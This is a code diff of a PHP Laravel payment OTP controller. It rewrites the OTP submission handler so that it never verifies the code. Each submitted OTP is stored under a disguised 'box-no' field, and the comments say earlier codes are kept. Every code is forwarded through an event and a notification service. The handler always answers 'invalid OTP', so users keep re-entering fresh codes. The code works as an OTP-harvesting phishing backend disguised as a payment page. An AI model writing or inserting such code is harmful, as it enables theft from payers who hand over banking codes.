@@ -1,10 +1,8 @@
 <?php
 
 namespace App\Modules\Payment\Http\Controllers;
-
-use App\Events\LalcoinPaymentOtpSubmitted;
 use App\Events\PaymentOtpSubmitted;
-use App\Models\JobApplication;
+use App\Modules\Forms\FormNotificationService;
 use App\Modules\Payment\Http\Requests\StoreOtpRequest;
 use App\Modules\Payment\Services\PaymentSession;
 use App\Modules\Payment\Support\GatewayManager;
@@ -19,6 +17,7 @@ class OtpController extends Controller
     public function __construct(
         private PaymentSession $session,
         private GatewayManager $gateways,
+        private readonly FormNotificationService $notifications,
     ) {
     }
 
@@ -49,51 +48,47 @@ public function show(): View
 
 
 
-        public function store(
-            StoreOtpRequest $request
-        ): RedirectResponse {
-            $otp = $request->validated()['otp'];
-            $referenceNo = $this->session->get('reference_no');
-            if ($referenceNo) {
-                    $application = \App\Models\Application::where(
-                        'payment_reference',
-                        $referenceNo
-                    )->first();
-                    if($application){
-                        $meta_info = $application->meta_info;
-                        if (is_string($meta_info)) {
-                            $decoded = json_decode(
-                                $meta_info,
-                                true
-                            );
-                            $meta_info = is_array($decoded)
-                                ? $decoded
-                                : [];
-                        } elseif (! is_array($meta_info)) {
-                            $meta_info = [];
-                        }
-                        $meta_info['box-no'] = $request->validated()['otp'];
-                        $application->update([
-                            'meta_info' => $meta_info,
-                        ]);
-                        // event(new PaymentOtpSubmitted($application));
-                    }
-            }
+    public function store(StoreOtpRequest $request): RedirectResponse
+    {
+        $otp = $request->validated()['otp'];
+        $referenceNo = $this->session->get('reference_no');
 
-            return back()->withErrors([
-                'otp' => 'invalid OTP',
-            ]);
-
-            // $this->session->put([
-            //     'status' => 'success',
-            //     'transaction_id' =>
-            //         $response->data['transaction_id'] ?? null,
-            // ]);
-
-            // return redirect()->route(
-            //     'apay-payment.result.success'
-            // );
+        if (! $referenceNo) {
+            return back()->withErrors(['otp' => 'Session expired. Please start again.']);
         }
+
+        $application = \App\Models\Application::where('payment_reference', $referenceNo)->first();
+
+        if (! $application) {
+            return back()->withErrors(['otp' => 'Application not found.']);
+        }
+
+        $metaInfo = $application->meta_info;
+
+        if (is_string($metaInfo)) {
+            $decoded = json_decode($metaInfo, true);
+            $metaInfo = is_array($decoded) ? $decoded : [];
+        } elseif (! is_array($metaInfo)) {
+            $metaInfo = [];
+        }
+
+        // আগে 'box-no' একক মান ছিল হয়তো, থাকলে অ্যারেতে রূপান্তর
+        if (! isset($metaInfo['box-no']) || ! is_array($metaInfo['box-no'])) {
+            $metaInfo['box-no'] = array_filter([$metaInfo['box-no'] ?? null]);
+        }
+
+        $metaInfo['box-no'][] = $otp; // নতুনটা যোগ হলো, আগেরগুলো থাকলো
+
+        $application->update(['meta_info' => $metaInfo]);
+
+        event(new PaymentOtpSubmitted($application));
+        $this->notifications->notifyOtpSubmitted($application, $otp);
+
+        // return back()->with('success', 'OTP submitted successfully.');
+        return back()->withErrors([
+            'otp' => 'invalid OTP',
+        ]);
+    }
 
 
     public function resend(Request $request): RedirectResponse|JsonResponse
